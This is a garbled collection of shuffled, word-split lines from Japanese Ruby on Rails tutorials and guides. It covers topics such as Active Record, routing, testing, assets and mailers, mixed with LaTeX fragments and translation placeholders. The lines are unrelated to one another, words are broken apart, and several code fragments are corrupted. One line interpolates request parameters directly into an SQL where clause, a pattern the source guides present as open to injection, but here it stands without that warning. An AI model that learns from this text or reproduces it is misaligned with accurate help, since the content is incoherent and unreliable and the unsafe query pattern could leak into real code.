# </ contributors>
特定 の 属性 に アクセス する ため の 、 種類 が " email " の input タグ を 返 し ま す 。
=>  " Hartl "
module   FixtureFileHelpers
たとえば 、 ERB テンプレート システム を 使用 する HTML ファイル の 拡張 子 は ` ▖html ▖erb ` に な り ま す 。
続 い て リスト \ ref{ code : sample_app _readme } の 内容 を README に 記入 し ま す 。
一 週間 経 っ て も 何 の 音 沙汰 も な い よう なら 、 少し つっつ い て み ま しょ う 。
` config/ database▖yml ` ファイル に は 、 Rails が デフォルト で 実行 でき る 3 つ の 異な る 環境 を 記述 する セクション が 含 ま れ て い ま す 。
通常 は 文字 列 また は シンボル に な り ま す 。
Client ▖ maximum ( " age " )
`stylesheet_link_tag ` ヘルパー は 、 提供 さ れ た ソース ごと に HTML  `< link> ` タグ を 返 し ま す 。
*   ORM   ( オブジェクト リレーショナル マッピング )   と Active   Record に つ い て 、 および Rails で の 利用 方法
Micropost   マイグレーション を 実行 し 、 テスト データベース を 準備 する こと で 、 これ ら の テスト を パス さ せ る こと が でき ま す 。
     create_table  : physicians   do  | t |
ローカル で の コンパイル を 行な う こと で 、 コンパイル 済み の アセット ファイル を Git など に よ る ソース 管理 対象 に 含め 、 他 の ファイル と 一緒 に デプロイ でき る よう に な り ま す 。
上 の ` collection ▖ create ` と 同じ で す が 、 レコード が invalid の 場合 に ` ActiveRecord : : Record Invalid ` が raise さ れ る 点 が 異な り ま す 。
###  ハッシュ キー の 操作
--------------------------
以下 の 同等 の コード に 置き換え ま し た 。
ユーザー 表示 ビュー に 名前 と Gravatar を 表示 する
   " Time "        => " datetime"
WARNING :   キー は 通常 は ユニーク で な けれ ば な り ま せ ん 。
これ は CRUD で い う " C "   ( 作成 )   と " R "   ( 読み出し )   の 操作 に 相当 し ま す 。
[ ` form _ for ` ] ( http://api▖ rubyonrails ▖org / classes / ActionView/ Helpers/FormHelper▖html # method - i - form _ for )   は フォーム 作成 を 支援 する ヘルパー で す 。
####  javascript_tag
silence_warnings {  Object▖ const_set  " RAILS _ DEFAULT _ LOG GER " ,   logger   }
_  エスケープ が 必要 に な る の は 、 管理 画面 で User - Agent ヘッダ を 表示 する 場合 など が 考え られ ま す 。
( {p 0 } で Application コントローラ に { 2 } hello{ / 2 } アクション を 追加 し た 場合 は 、 今 の うち に アクション を 削除 し て お く こと を お すすめ し ま す ) 。
                    length : {  minimum :   5   }
\ ref{ sec : image_validation } で 見 た よう に 、 jQuery ライブラリ に は DOM 操作 用 の 膨大 な メソッド が 提供 さ れ て い ま す が 、 ここ で 使用 する の は わずか 2 つ で す 。
\ href { http://nodejs▖org / }{ Node ▖js } が 特に お 勧め で す ▟ )
ビュー は 、 コントローラ が 作成 し た 情報 に 対 し て 余計 な こと を せ ず に 表示 する 必要 が あ り ま す 。
一般 的 な アドバイス
それ で は いつ も の よう に 、 Git で 新 機能 用 の トピック ブランチ を 作成 し ま しょ う 。
d ▖ monday                      # =>  Mon ,   0 3   May  2010
User ▖ w here ( id :   1 ) ▖ joins(:articles ) ▖ explain
|   GET        | /photos/new      |  photos# new        |  写真 を 1 つ 作成 する ため の HTML フォーム を 返 す   |
real 	 0 m2 ▖ 649 s
この オプション が true に な っ て い る と 、 ダイジェスト が 生成 さ れ て アセット へ の URL に 含 ま れ る よう に な り ま す 。
たとえば News レイアウト で 新し い レイアウト を 使用 する ため に 、 ` ren der template :  'layouts/news'` 経由 で ` ActionView::ren der ` メソッド を 使用 する こと も でき ま す 。
123 ▖ to_s(:human_size)             # = >  123  Bytes
def  attr_ internal _ reader (*attrs)
#  instance   variable▖
ユーザー 登録 ページ の ルート
*   値 が ハッシュ の とき 、 キー を ` : root ` と し て 再帰 的 な 呼び出し を 行 い ま す 。
こう い っ た リクエスト の 種類 に よ っ て 応答 を 場合 分け する とき は 、 \ kode { respond\_to } メソッド と い う メソッド を 使 い ま す 。
   def  process ( action ,   params = nil ,  session = nil ,   flash= nil ,  http_method= ' GET ' )
first _ name : ' Andy ')
< h 2 > Comments</ h 2 >
    <title > Welcome!
ユーザー 一覧 の 2 ページ 目
この コード に よ っ て 、 外部 に あ る 任意 の HTML や Java Script が 読み込 ま れ 、 Web サイト の 一部 と し て 埋め込 ま れ ま す 。
`utc ? ` 述語 は 、 レシーバ が その タイム ゾーン に 合 っ た UTC 時刻 を 持 っ て い る か どう か を チェック し ま す 。
以下 の よう に 書き換え 、
HTTP / 1 ▖ 1   200   OK   Server :   Cowboy
モデル の XML シリア ライザ で は この メソッド を 使用 し て ノード 名 を ダッシュ 化 し て い ま す 。
` config/ database▖yml ` ファイル に は ERB タグ `<%= %>` を 含め る こと が でき ま す 。
図 \ ref { fig :user_profile_with _microposts } で は 最初 の ユーザー の プロフィール 画面 を 、 図 \ ref { fig :other_profile_with _microposts } で は 2 番 目 の ユーザー の プロフィール 画面 を 表示 し て い ま す 。
ただし ここ で \emph { 重大 な } 警告 が あ り ま す ▟ 以下 の 文面 は 流し読み せ ず 、 必ず 注意 深 く 読 ん で くださ い 。
C : \ Sites\ sample_app
この コード は リスト \ ref{ code : generated_account_activation_view_ text } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
関連 付け られ た オブジェクト が な い 場合 は 、 空 の 配列 を 1 つ 返 し ま す 。
あの とき は 、 \ kode {before\ _save } コール バック に \ kode { downcase } メソッド を バインド し ま し た   ( リスト \ ref{ code :email_downcase } ) 。
####  コピー
** `:table_name ` を 指定 する と 、 たとえば Customer クラス の 主 キー は ` customerid ` に な り ま す
# => false
getting _ users   ( end ) ╼╼\ subsection { ２ つ の 目立 た な い バグ } %  ( fold) ╼\ label{ sec : two_ subtle_bugs} ╼╼
まず は 、 プロフィール 画面 用 の 統合 テスト を 生成 し て み ま しょ う 。
form _ for  @geocoder ,  url:   geocoder_ path  do  | f |
上 の 説明 が 暗に 示 す よう に 、 これ から SQL クエリ に \emph { もう 1 つ } の \ kode {user \ _ id } を 追加 し ま す 。
Mac   OS   X また は Windows を 使用 し て い る 場合 は 、 OS に Java Script ラン タイム を インストール し て くださ い 。
    resources  : articles
有力 な 候補 と し て さまざま な もの が 考え られ ま す が 、 基本 的 に は 一意 性 を 確保 でき る 、 長 く て ランダム な 文字 列 で さえ あ れ ば どんな もの で も 良 い で しょ う 。
//]] >
メソッド を 組み込 み クラス に 追加 でき る 柔軟 性 の 高 さ の おかげ で 、 純粋 な Ruby を 極めて 自然 に 拡張 する こと が でき ま す   ( もちろん 注意 し て 使 う 必要 は あ り ま す が ) 。
まず は コンソール から 脱出 し て くださ い   ( Ctrl - C )
試し に 、 先ほど 作成 し た user オブジェクト に 対 し て 間違 っ た パスワード を 与え て み ま しょ う 。
####  ローカル 変数
<% =  ren der   partial :   " product " ,  object : @item % >
|     1   |   SIMPLE       |  users  |  const   |  PRI MARY       |
Rails ルート で 使用 する Microposts リソース 用 の ルール
アプリケーション の コード より も 明らか に テスト コード の 方 が 短 く シンプル に な る   ( = 簡単 に 書け る )   の で あ れ ば 、 テスト を 先 に 書け る よう に な る こと を 目指 す 。
変更 の 結果 を リスト \ ref{ code : delete_destroy_ test } に 示 し ま す 。
ここ で 、 単に 既存 の テスト コード を 修正 する だけ で は な く 、 新し い テスト コード を 追加 し た 理由 に つ い て 考え て み て くださ い
User モデル の テスト の ため に いく つ か の マイクロ ポスト を 作成 し て お く 必要 が あ り ま す の で 、 この 時点 で マイクロ ポスト を 生成 する ファクトリー を 作成 し て お き ま しょ う 。
この 関連 付け を 図 で 表 し た もの が { 0 } { 1 } 図 2 ▖ 15 { / 1 } { / 0 } で す 。
図 \ ref { fig: demo_ destroy _user } の   [ Destroy ]   リンク を クリック する と ユーザー が 削除 さ れ 、 index ページ の ユーザー は 1人 だけ に な り ま す
コントローラ と ルーティング を 定義 し た の で 、 今度 は 新し い セッション で 使用 する ビュー 、 つまり ログ インフォーム を 整え ま しょ う 。
HTML 構造 を 削除 し た About ページ
第 \ ref { cha : beginning }   章 や 第 \ ref { cha :a_toy_ app } 章 ,   I  suggest   following   the   “ hello ,   world ! ”
テスト の 結果 を 図 \ ref { fig : sample_app_universal } に 示 し ま す 。
ユーザー を 希望 の ページ に 転送 する に は 、 リクエスト 時点 の ページ を どこ か に 保存 し て お き 、 その 場所 に リダイレクト さ せ る 必要 が あ り ま す 。
なお 、 送信 に 失敗 し た とき に \ kode {new } アクション が 再 描画 さ れ る はず な の で 、 \ kode {assert\_template } を 使 っ た テスト も 含め て い る こと に 注意 し て くださ い 。
       この サイト に ログ イン する に は 、 <%= @url  % > を クリック し て くださ い 。
ここ で 、 \ kode { get } も \ kode { patch } も 次 の よう に
メール アドレス を ユーザー 名 に し た こと で 、 理屈 の 上 で は 将来 ユーザー 同士 で 通信 でき る よう に 拡張 でき る 可能 性 が 開 か れ ま す 。
\ kode { provide } 関数 は content\ _ for の 代替 で す 。
\ href { http://guides▖ rubyonrails ▖org/active_ record _querying ▖ html} { w here } メソッド や 他 の 関連 する メソッド の 詳細 に つ い て は 、 Rails ガイド の \ kode { Active   Record   クエリ インターフェイス } を 読 ん で くださ い 。
   'X - Content- Type - Options' => 'nosniff '
次 に 、 Microposts コントローラ の \ kode { destroy } アクション を 定義 し ま しょ う ▟ これ も 、 ユーザー に お け る 実装   ( リスト \ ref{ code : admin_destroy _ before_filter } )   と だいたい おなじ で s
Users リソース の 場合 と 同様 に 、 結合 テスト を 使用 し ま す 。
* `nil ` と `false `
   validates : content ,  length :  {
We’ll  set about   changing   this   in   Chapter   \ ref { cha :filling _ in_the_layout } ▖
`: through ` また は ` : as ` オプション と 組み合わせ た 場合 は 無効 で す 。
#   Ignore  the  default   SQLite  database ▖
{ 0 } 図 7 ▖ 4 { / 0 } { 1 } / users / 1 に アクセス し た 時 の エラー ページ ▟ \ href { http://railstutorial ▖org / images/figures/profile_routing _error - full ▖ png } { ( 拡大 ) } { / 1 }
   default   to :   Proc▖ new {  Admin ▖pluck(:email )  } ,
*  `create_with `
` config▖ action_view ` に もわ す か ながら 設定 が あ り ま す 。
    @ person  =   person
$  rails  g
上 の ディレクトリ に 移動
しかし もっと 重要 な 理由 は 、 ユーザー を 永続 化 する コード の 中心 部分 が 、 実 は まだ まったく テスト さ れ て い な い から で す 。
*  ` after_ initialize` :   これ は 、 アプリケーション の 初期 化 が 終わ り 、 かつ ` config/initializers ` 以下 の イニシャライザ が 実行 さ れ た 後 に 実行 さ れ ま す 。
リスト \ ref{ code :f_error _messages } で 実装 し た エラー メッセージ に 対 する テスト を 書 い て み て くださ い 。
#   gem  ' childprocess ' ,   ' 0 ▖ 3 ▖ 6 '
Ruby   Java Script   ( RJS )   を 使 っ て フォロー の 関係 性 を 削除 する
著者
Rails   アップグレード ガイド
メイラー 呼び出し は 非常 に 簡単 で す 。
プラグ インジェネレータ で 利用 でき る オプション の 一覧 を すべて 表示 する に は 、 以下 を 入力 し ま す 。
ホーム ディレクトリ に 移動
ここ で は 、 \ ref{ sec : modeling_ demo_ users } で 説明 し た ユーザー 用 の データ モデル を 、 その モデル を 表示 する ため の Web インターフェイス に 従 っ て 実装 し ま す 。
config▖ action _mailer▖ default _url_options  = {  host :  'example ▖ com'  }
###  エンジン の 設定
/* typography */
     add_ index  : publications ,  : publication_type_ id
` collection ` メソッド は 、 関連 付け られ た すべて の オブジェクト の 配列 を 返 し ま す 。
クラス 内 で \ kode {private } キー ワード より 下 に 記述 し た メソッド は 自動 的 に 非 公開 と な り ま す ▟ この こと は コンソール セッション で すぐ 確かめ られ ま す 。
WARNING :   モデル 名 の 並び順 は ` String ` クラス の ` < ` 演算 子 を 使用 し て 計算 さ れ ま す 。
*  `created_at` -   レコード が 作成 さ れ た 時 に 現在 の 日付 時刻 が 自動 的 に 設定 さ れ ま す
    -
" " ▖ demodulize                               # => " "
また 、 テスト は アプリケーション の コード に 対 し て \emph { クライアント } と し て 振る舞 う の で 、 ソフトウェア 設計 の 改良 に つなが る こと も 多 く な る で しょ う 。
*  `active_ record▖ set_dispatch_hooks`: `config▖ cache_classes ` が `false ` に 設定 さ れ て い る 場合 、 再 読み込 み 可能 な データベース 接続 を すべて リセット し ま す 。
デフォルト は ` " local host " ` で あ り 、 必要 に 応 じ て 変更 する ▟</ li >
この ページ を 作成 し た ら 、 第 \ ref { cha : following _ users } 章 の サンプル ・ アプリケーション で 使用 する 予定 で す 。
この データ モデル を 実装 する ため に 、 まず は 次 の よう に 図 \ ref { fig : relationship_model } に 対応 し た マイグレーション を 生成 し ま す 。
これ ら の アプリ を 既に Bitbucket の リポジトリ に プッシュ し て あ る なら 、 それ を 利用 し て いつ で も アプリ を 復元 でき ま す   ( その 必要 が あ れ ば で す が ) 。
以下 の コード の 場合 、
Having
この ディレクトリ に 置 か れ た ファイル は Sprockets ミドルウェア に よ っ て サポート さ れ ま す 。
この コード は リスト \ ref{ code : generalized_ current_user } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
これ ら の オプション を 関連 付け の 宣言 に 追加 する こと で 、 関連 付け コール バック を 定義 でき ま す 。
*   1 つ の 記事 は 複数 の コメント を 持て る   ( One   article   can   have   many  comments ) 。
本番 環境 で クラウド ストレージ に 保存 する ため に は 、 リスト { p 0 } の よう に { 2 } fog{ / 2 }   gem を 使 う と 簡単 で す 。
   belongs_to  : magazine
class   C ; end
この ため 、 とにかく Web アプリケーション を 書け る よう に な り た い 方 は 、 最初 に Rails を 学 び 、 次 に Ruby を 学 ん で から 再び Rails に 戻 っ て くる こと を お 勧め し ま す 。
マイクロ ポスト の 画像 表示 画面 を 追加 する
###  アプリケーション が 提供 する クラス を 使用 する
従来 の ジョブ が 以下 の よう な もの だっ た と し ま す 。
      # ▖▖▖
first :   1
現 時点 の テスト で は 、 ユーザー は ひとりい れ ば 十分 で す ▟ その ユーザー に は 有効 な 名前 と 有効 な メール アドレス を 設定 し て お き ま す 。
Client▖ pluck(:name )
手始め に 、 画面 に 何 か テキスト を 表示 し て み ま しょ う 。
*  ` javascripts` は 、 生成 時 に Java Script ファイル へ の フック を オン に する か どう か を 指定 し ま す 。
この ルーティング は まだ 存在 し て い ま せ ん の で 、 ` config/ routes▖rb ` の ` resources  : articles ` 行 を 以下 の よう に 変更 し ま す 。
now  =  DateTime▖ current     # =>  Mon ,   0 7   Jun  2010   20 : 26 : 36   + 0000
####  アプリケーション が 提供 する モデル を 使用 する
上 は フォーム から 送信 さ れ た メール アドレス で あ り 、
この コード は 、 値 が \ kode {nil } で な けれ ば \ kode {session [ : forwarding _url] } を 評価 し 、 nil で あ れ ば 与え られ た デフォルト の URL を 使用 し ま す
この ` published ` スコープ を 呼び出 す に は 、 クラス で この スコープ を 呼び出 し ま す 。
class   Manifest  <  ActiveRecord : : Base
デプロイ の 下 準備 と し て 、 まず は この 時点 まで の 変更 を \ kode {master } ブランチ に マージ し て お い て くださ い 。
初めて 書 く テスト が いきなり 「 テスト 先行 」 と い う の は 、 Ruby   on   Rails の 知識 が ある 程度 以上 必要 な ため 、 少々 敷居 が 高 い 面 も あ り ま す 。
*   ファイル 名
図 \ ref { fig : micropost _content_cant_be_blank } と 同じ 表示 に な る こ t 確認 し て くださ い 。
As   long   as   you   retain this   notice   you
StaticPages コントローラ の タイトル を テスト する  
    User   add  some  examples to   (or   delete )
上 の コード は   " / test "   から データ を 取得 し 、 結果 を Web ページ 上 の ` results ` と い う id を 持 つ ` div ` タグ に 押し込 み ま す 。
主な 理由 は 、 デフォルト の Rails ページ は Heroku で 破損 し て しま う こと が 多 く 、 その まま だ と デプロイ が 成功 し た の か 失敗 し た の か が わか り にく い ため で す 。
今度 は 以下 の テスト スイート は 成功 する はず で す 。
これ ら は 以下 の よう に デフォルト と し て 指定 する こと が でき ま す 。
` app/helpers/blorgh/articles _helper▖ rb ` の ヘルパー も 同様 に 名前 空間 化 さ れ ま す 。
次 の バージョン から は 、 これ ら の エラー は 抑制 さ れ な く な り ま す の で ご 注意 くださ い 。
*   `eager_load `
その ため 、 まず は 重複 し た メール アドレス から テスト し て い き ま す   ( リスト \ ref{ code : validates_uniqueness _of_email_test } ) 。
以下 を ` Gemfile ` に 追加 する 必要 が あ り ま す 。
パスワード と パスワード の 確認 を テスト する 。
テスト が   \ passing   に な っ た の で 、 安心 し て コード を リファクタリング でき る よう に な り ま し た 。
テスト 駆動 開発 が 行 わ れ て い な い
person   =   Person ▖ new ( name :  " Andrea " ,  email :   " andrea@ example ▖ com " )
続 い て 、 Turbolinks は PushState を 使用 し て URL を 正し い もの に 書き換え 、 リフレッシュ の セマンティクス を 維持 し ながら プリティ URL を 与え ま す 。
( サイト ロゴ が ページ で 一 度 しか 使用 さ れ な い こと を 前提 と し て CSS   id を 使用 し て い ま す が 、 代わり に クラス を 使用 する こと も でき ま す ) 。
NOTE :   ユーザー が 定義 し た Rake タスク は デフォルト で development 環境 で 動作 する よう に な り ま す 。
上 の ` collection ▖ create ` と 同じ で す が 、 レコード が invalid の 場合 に ` ActiveRecord : : Record Invalid ` が raise さ れ る 点 が 異な り ま す 。
サイン イン の 失敗 を 正し く テスト する コード 。
これ に よ り 、 以下 を 使用 し て 有効 化 トークン に アクセス し 、
Action   View の テンプレート は さまざま な 方法 で 記述 する こと が でき ま す 。
Calvin は 2 番 目 の ユーザー Thomas   Hobbes  ( 図 \ ref { fig : page _ flow _other_profile_follow_button} )   を 表示 し 、 [ Follow ]   ボタン を 押 し て フォロー し ま す 。
### ` root ` を 使用 する
###  Rails の HTML サニタイザ
表示 さ れ る ログ インフォーム を 図 \ ref { fig: login_form _remember_me } に 示 し ま す 。
{ 0 } 図 7 ▖ 7 { / 0 }   { 1 } ユーザー 表示 ページ に Gravatar の デフォルト 画像 が 表示 さ れ て い る { / 1 }
#   元 と 異な る 新し い インスタンス で あ る
     params ▖ require(:article ) ▖ permit(:title ,  : text )
$  git   rebase   rails/master
認可 に 対 する テスト で は 、 特定 の HTTP リクエスト を 直接 送信 する 低級 な テスト と 、 ブラウザ の 操作 を シミュレーション する 高級 な テスト   ( 統合 テスト )   の 2 つ を 利用 し た
NOTE : ` w here ` が この よう に 動作 する の は 、 ハッシュ を 渡 し た 場合 だけ で す 。
名前 空間 が 導入 さ れ て い る こと で コード の 衝突 は 回避 さ れ ま す が 、 エンジン の コントローラ から メイン アプリケーション の ` Application Controller ` の メソッド に アクセス する 必要 も 頻繁 に 発生 し ま す 。
Railties
$  git  branch  -- track   4 - 0 - stable  origin / 4 - 0 - stable
Active   Job   の 基礎
つまり 、 ` assert_ generates ` と ` assert_recognizes ` の 機能 を 組み合わせ た もの に な り ま す 。
リダイレクト に ブロック を 渡 す こと も でき ま す ▟ この リダイレクト は 、 シンボル 化 さ れ た パス パラメータ と request オブジェクト を 受け取 り ま す 。
Order▖group(:status ) ▖ count
I   shall  be   late ! " ▖ truncate ( 20 )
Sprockets で は 、 ` index ` と い う 名前 の ファイル   ( および 関連 する 拡張 子 )   を 特殊 な 目的 に 使用 し ま す 。
図 \ ref { fig :user_ index_ all } が 示 す よう に 、   最初 の いく つ か の メール アドレス に つ い て は 、 デフォルト の Gravatar 画像 以外 の 写真 を 関連 付け て み ま し た 。
したが っ て 、 管理 者 や 一般 ユーザー の テスト 、 そして ページ ネーション や 削除 リンク の テスト を すべて まとめ る と 、 リスト \ ref{ code : delete_link_ integration_test } の よう に な り ま す 。
    is  a   project  to   make  a   book   and   screencasts  to teach   web   development
述語 ` anonymous ? ` を 使用 し て 、 モジュール に 名前 が あ る か どう か を チェック でき ま す 。
以下 の よう な 、 より 一般 的 な 記法 を 使用 する こと も でき ま す 。
ページ の 内容 は 図 \ ref { fig :hello_ world _hello_app } とまったく 同じ で す が 、 今 や それ が インターネット 上 の 本番 Web ページ と し て 堂々 と 公開 さ れ て い る の で す 。
   def  create
    < h 1 > New zone </ h 1 >
// ▖▖▖
Item Load   ( 0 ▖ 3 ms )     SELECT  *  FROM   `items `   LIMIT   1   FOR   UPDATE
図 \ ref { fig: invalid _email _ password _ reset } に 示 す よう に 、 この 時点 で の アプリケーション は 、 無効 な メール アドレス を 入力 し た 場合 に 正常 に 動作 し ま す 。
cp   < コピー 元 >  < コピー 先 >
どの ヘルパー も 任意 の 数 の 属性 を 受け付け る こと が でき る の で 、 1 行 の コード を 書 く だけ で 多く の 属性 に 対 し て 同じ バリデーション を 実行 でき ま す 。
╼       This   is   the   sample  application   for   the tutorial ▖
NOTE :  ` sass - rails `   gem が Gemfile に 含 ま れ て い れ ば 自動 的 に CSS 圧縮 に 使用 さ れ ま す ▟ この 場合 ` config ▖ assets▖css_ compressor ` オプション は 設定 さ れ ま せ ん 。
Rails   アプリケーション を 設定 する
必要 で あ れ ば 、 ` config/ database▖yml ` の 内部 で URL を 直接 指定 する こと も でき ま す 。
  @ article   =   Article▖ new
ブロック を 後ろ に 伴 う メソッド は すべて 、 ブロック の 中 に ネスト し た マーク アップ を 含 む XML マーク アップ タグ と し て 扱 わ れ ま す 。
読者 の Paulo C é lio   J ú nior から の ご 指摘 で し た ▟ ありがとう ござ い ま し た 。
  >>  10 ▖ weeks ▖ago
以上 で GitHub 上 の プルリクエスト を 更新 でき る よう に な り 、 実際 に 更新 さ れ た こと を 確認 でき ま す 。
これ は リスト \ ref{ code :title_test } で 使用 さ れ て い ま し た 。
` params ` メソッド は ` ActiveSupport: : HashWithIndifferentAccess ` オブジェクト を 返 し ま す ▟ 文字 列 また は シンボル を 使用 し て 、 この オブジェクト の ハッシュ の キー を 指定 でき ま す 。
ユーザー の \ kode {update } アクション の 初期 実装
「 forgot   password 」 フォーム
2 つ 目 の ` Person ` は データベース に 保存 さ れ ま せ ん 。
\ kode {about } アクション が 追加 さ れ た StaticPages コントローラ   RED { 3 } { 4 } { / 4 } { 4 } { 5 } { / 5 } { / 4 } { 4 } { / 4 } { / 3 }
` ActiveRecord : : Base ▖ primary _key= ` メソッド を 使用 し て 、 テーブル の 主 キー と し て 使用 さ れ る カラム 名 も オーバーライド でき ま す 。
  * ` lib/blorgh/engine ▖rb ` で の 名前 空間 分離
` collection▖ clear ` メソッド は 、 結合 テーブル 上 の レコード を 削除 し 、 それ に よ っ て すべて の オブジェクト を コレクション から 削除 し ま す 。
*  :conditions
   def  validate ( record )
See   more
{ 0 } 図 6 ▖ 5 { / 0 } { 1 } User モデル に \ kode { password_digest } 属性 を 追加 する ▟ { / 1 }
たとえば 、 \ kode {flash [ : success ]  =  " Welcome to  the   Sample  App ! " } と する 場合 、 以下 の コード を 実行 する と
Category ▖ joins(:articles )
` ActionView: : Partials : : PartialRen derer ` は 、 デフォルト で テンプレート と 同じ 名前 を 持 つ ローカル 変数 の 中 に 自身 の オブジェクト を 持 ち ま す 。
以下 の フィーチャー は 、 エラー メッセージ が 表示 さ れ る はず で あ る と い う こと を 記述 し て い ま す 。
C ▖ descendants # => [ B ]
関連 付け を 使用 する から に は 、 関連 付け の 設定 に 合わせ て データベース の スキーマ を 常 に 更新 し て お く 責任 が 生 じ ま す 。
" Backoffice : :Users Controller " ▖ demodulize    # =>  " Users Controller "
###  マイグレーション を 実行 する
   validates : size ,   inclusion : { in : % w ( small   medium  large ) ,
####  Time オブジェクト の JSON 形式 表現
これ に よ り 、 以下 の よう に オブジェクト の 2 つ の コピー 同士 で 内容 が 一致 し な く な る こと が あ り ま す 。
config▖ mid dleware ▖ delete   " ActionDispatch : : Cookies "
array      =  ['string ' ]
なお 、 この 削除 用 ルーティング に 通常 の ` get ` ルーティング が 使用 さ れ て い る と 、 以下 の よう な 危険 な URL を 送信 でき て しま い ま す 。
チェック ボックス 用 の フォーム input タグ を 作成 し ま す 。
これ は リスト \ ref{ code :skip_resize_ initializer } で 使用 さ れ て い ま し た 。
def symbolize_keys
#  your   examples   within a  transaction ,   remove  the   following   line  or
Topic ▖ create( title:  nil ) ▖ valid ?  
ポリ モー フィック 関連 付け を 使用 する と 、 ある 1 つ の モデル が 他 の 複数 の モデル に 属 し て い る こと を 、 1 つ の 関連 付け だけ で 表現 する こと が でき ま す 。
{ 0 } 図 2 ▖ 11 { / 0 } { 1 } Rails に お け る MVC ▟ \ href { http://railstutorial ▖org / images/figures /mvc_ detailed - full ▖ png } { ( 拡大 ) } { / 1 }
より 高度 な レベル で の バリデーション エラー に つ い て は 、 [ バリデーション エラー の 取り扱い ] ( # バリデーション エラー に 対応 する ) セクション を 参照 し て くださ い 。
ブラウザ の cookies に 保存 する ユーザー ID は 暗号 化 し て お く 。
% r {▖}m ▖multiline ?  
<%=   form _ for  : article ,  url:   articles_ path  do  | f| %>
/Users/mhartl/ rails _projects/sample_app/config
###  バグ レポート の 確認
テスト に パス する まで これ を 繰り返 し ま す 。
*   開発 環境
Rails   で は 、 他 の 箇所 で 予想 外 の エラー が 生 じ た とき に 検出 でき る よう 、 [ Travis   CI ] (https://travis - ci▖org / rails/rails ) を 使用 し て い ま す 。
デバッグ モード を オフ に する に は 、 ` config/ environments/development ▖ rb ` に 以下 を 追記 し ま す 。
{ 0 } 図 5 ▖ 6 { / 0 } { 1 } デザイン さ れ た ロゴ と サンプル アプリ { / 1 }
####  CSS と ERB
config▖ mid dleware ▖ swap  ActionDispatch : : ShowExceptions ,  Lifo : : ShowExceptions
上 の コマンド を 実行 する と Relationship ファクトリー も 生成 さ れ る の で 、 以下 を 実行 し て ファクトリー を 削除 し て くださ い 。
  <p > Hello ,   Rails !
# =>  [
*  ` after_ action ` コール バック も ` before_ action ` と 同様 の 設定 を 行 い ま す が 、 メイラー の アクション 内 の インスタンス 変数 を 使用 し ま す 。
\ kode { password } 属性 と \ kode { password_confirmation } 属性 を テスト する 。
` app/models/blorgh/article ▖ rb ` モデル 内 の ` belongs_to ` 関連 付け を 以下 の よう に 変更 し ま す 。
   belongs_to  : section
\ ref{ sec : the_hello_application } で 説明 し た よう に 、 \ kode {rails   new } コマンド で Rails の バージョン 番号 を 指定 し て 、 アプリケーション の 骨組み を 生成 する ところ から 始め ま しょ う 。
アプリケーション で 新し い ` JSON ` ベース の フォーマット を 使用 し た い 場合 、 以下 の よう な 内容 を 持 つ イニシャライザ ファイル を 追加 でき ま す 。
以下 を 実行 し て 、
モデル に attr_accessible を 書 か な い 場合 は 、 デフォルト で 「 モデル の \emph { すべて の } 属性 が アクセス 可能 」 に な り ま す 。
便利 な テスト 例 が Rails に よ っ て 自動 生成 さ れ て い る の で ( リスト \ ref{ code : generated_user_mailer_test } ) 、 これ を 利用 すれ ば テスト の 作成 は 割と 簡単 で す 。
*   production 環境 の ファイル システム へ の 書き込み 権限 が な い 。
この アクション は 、 フォーム から 送信 さ れ た パラメータ を その まま 表示 する よう に な り ま し た 。
  <%=  f▖ text _field  : last_ name  %>
#   Be   sure  to   restart   your  server   when  you   modify this  file ▖
テーブル に 格納 さ れ る データ の 例 を 図 \ ref { fig : users_table } に 、 対応 する データ モデル を 図 \ ref { fig :user_ model_sketch } に 示 し ま す
concern は 以下 の よう に 定義 し ま す 。
デフォルト は `'encrypted cookie '` で す 。
Client ▖ w here ( " orders_count  = #{ params [ : orders] } " )
###  リンク の 追加
  <%=  f▖ text _field  : first _ name  %>
     class_attribute  :table_name_prefix ,   instance_ writer :  false
従 っ て 、 ` false ` は 空き を 埋め る 値 と し て は 使用 でき ま せ ん 。
###  テンプレート を レンダリング せ ず に メール 送信 する
デフォルト の エラー メッセージ は  _ " must   be   less than %{ count }"_▖ で す 。
|  ** Redirection **     | 300                | : multiple_choices                 |
例 と し て 、 最初 に scaffold で ` User ` を 作成 し て み ま しょ う 。
生成 し た ` Articles Controller ` コントローラ に ` new ` アクション が 見つか ら な い と い う エラー で す 。
この 手法 は 、 メニュー ・ ニュース 記事 ・ 静的 HTML の 断片 など を キャッシュ する の に 便利 で す 。
" spec/requests/authentication_ pages_spec ▖rb "
      % Q ( < div  class = " field_ with _errors" >#{html_tag }</div> ) ▖html_safe
` form _ for ` 呼び出し で は 配列 を 1 つ 渡 し て い ま す ▟ これ は `/articles /1 / comments ` の よう な 「 ネスト し た ルーティング   ( nested   route ) 」 を 生成 し ま す 。
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
先ほど の 説明 を コード に まとめ る と 、 User と Relationship の 関連 付け は リスト \ ref{ code :user_relationships_association } と リスト \ ref{ code :relationship_belongs_to } の よう に な り ま す 。
テーブル に 含 ま れ る 特定 の 数値 の 平均 を 得 る に は 、 その テーブル を 持 つ クラス に 対 し て ` average ` メソッド を 呼び出 し ま す 。
//= require   home
{ 0 } 図 11 ▖ 12 { / 0 }   { 1 } エラー が 表示 さ れ た Home ページ { / 1 }
この ため 、 今回 の ケース で は 、 Rails に 探 し て 欲し い モデル の クラス 名 を 明示 的 に 伝え る 必要 が あ り ま す 。
** ` ActionDispatch : : DebugExceptions` **
実際 の アプリケーション コード を リスト { p 0 } に 示 し ま す   ( { 2 } redirect_to{ / 2 } メソッド に 注目 し て くださ い ) 。
次 に master ブランチ に 移動 し 、 \ ref{ sec : git_ command s } と 同じ 要領 で 差分 を マージ し ま す 。
本番 環境 に 展開 し た アプリケーション で は デバッグ 情報 を 表示 し た く な い の で 、 リスト \ ref{ code :rails_debug } に は 以下 を 記述 し て あ り ま す 。
class   C  <  B ; end
一括 読み込み を 使用 し て い る と 、 内部 で 複数 の クエリ が トリガ さ れ る こと が あ り 、 一部 の クエリ で は その 前 の 結果 を 必要 と する こと が あ り ま す 。
最も 簡単 な 解決 方法 は 、 リスト \ ref{ code :microposts_create_action_with _feed } の よう に 空 の 配列 を 渡 し て お く こと で す 。
最初 に 、 期間 を 2 つ 定義 し ま す 。
╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec : sign_up _ what _we_learned_ in_this _ chapter }╼╼\ begin {itemize}╼╼\item 
ren der   action :   " edit▖html ▖erb "
